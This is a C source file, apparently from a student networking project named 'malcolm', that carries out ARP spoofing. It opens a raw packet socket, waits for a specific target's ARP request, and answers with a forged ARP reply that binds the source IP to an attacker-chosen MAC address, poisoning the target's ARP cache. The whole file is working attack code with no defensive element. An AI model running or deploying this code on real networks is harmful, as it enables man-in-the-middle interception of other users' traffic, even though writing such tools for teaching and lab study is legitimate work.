#include "../include/malcolm.h"

#define SOURCE 0
#define TARGET 1
#define IPV4_L 4
#define MAC_L 6
#define ERR -1
#define BAD 1
#define GOOD 0

int
crt_sock(t_malcolm *m) {
	int fd = -1;
	if ((fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) == -1)
		return (-1);

	if (setsockopt(fd, SOL_SOCKET, SO_BINDTODEVICE, m->itrf, s_len(m->itrf)) == -1)
			return (-1);
	return (fd);
}

void
wfor_arp(t_malcolm *m) {
	unsigned char buf[42];
	struct sockaddr_ll from;
	memset(&from, 0, sizeof(from));
	socklen_t lenfrom = sizeof(from);
	ssize_t r = recvfrom(m->fd, buf, sizeof(buf), 0, (struct sockaddr*)&from, &lenfrom);
	if (r < 0)
		return;
	t_ether_hdr *eth = (t_ether_hdr *)buf;
	t_arp_hdr *arp = (t_arp_hdr*)(buf + sizeof(t_ether_hdr));
	if (ntohs(arp->op) == ARPOP_REQUEST && ntohs(eth->type) == ETH_P_ARP) {
		if (cmp_mem(arp->spa, &m->trg_ip, IPV4_L) != 0)
			return;
		if (cmp_mem(arp->sha, &m->trg_mac, MAC_L) != 0)
			return;
		if (cmp_mem(arp->tpa, &m->src_ip, IPV4_L) != 0)
			return;
		printf("[🏷️ ]: An ARP request has been broadcast.\n"
			"	MAC address of request: %02x:%02x:%02x:%02x:%02x:%02x\n"
			"	IP address of request: %hhu.%hhu.%hhu.%hhu\n",
				arp->sha[0], arp->sha[1], arp->sha[2], 
				arp->sha[3], arp->sha[4], arp->sha[5],
				arp->spa[0], arp->spa[1], arp->spa[2],
				arp->spa[3]);
		sto_arp(m, arp);
		ffs_exit(free_malcolm, m);
	}
	return;
}

void sto_arp(t_malcolm *m, t_arp_hdr *old_arp) {
	
	unsigned char new_buf[42];
	t_ether_hdr *eth = (t_ether_hdr *)new_buf;
	cpy_mem(eth->dmac, m->trg_mac, MAC_L);
	cpy_mem(eth->smac, m->src_mac, MAC_L);
	eth->type = htons(ETH_P_ARP);

	t_arp_hdr *arp = (t_arp_hdr*)(new_buf + sizeof(t_ether_hdr));
	cpy_mem(arp->sha, m->src_mac, MAC_L);
	cpy_mem(arp->spa, m->src_ip, IPV4_L);
	cpy_mem(arp->tha, old_arp->sha, MAC_L);
	cpy_mem(arp->tpa, old_arp->spa, IPV4_L);
	arp->op = htons(ARPOP_REPLY);
	arp->pln = IPV4_L;
	arp->hln = MAC_L;
	arp->pro = htons(0x0800);
	arp->hrd = htons(1);

	struct sockaddr_ll from;
	memset(&from, 0, sizeof(from));
	from.sll_family = AF_PACKET;
	from.sll_ifindex = if_nametoindex(m->itrf);
	if (from.sll_ifindex == 0)
		f_exit(1, free_malcolm, m, strerror(errno));
	from.sll_halen = MAC_L;
	cpy_mem(from.sll_addr, eth->dmac, MAC_L); 
	socklen_t lenfrom = sizeof(from);


	ssize_t r = sendto(m->fd, new_buf, sizeof(new_buf), 0, (struct sockaddr*)&from, lenfrom);
	if (r < 0)
		f_exit(1, free_malcolm, m, strerror(errno));
	f_exit(0, free_malcolm, m, "packet sent");
}
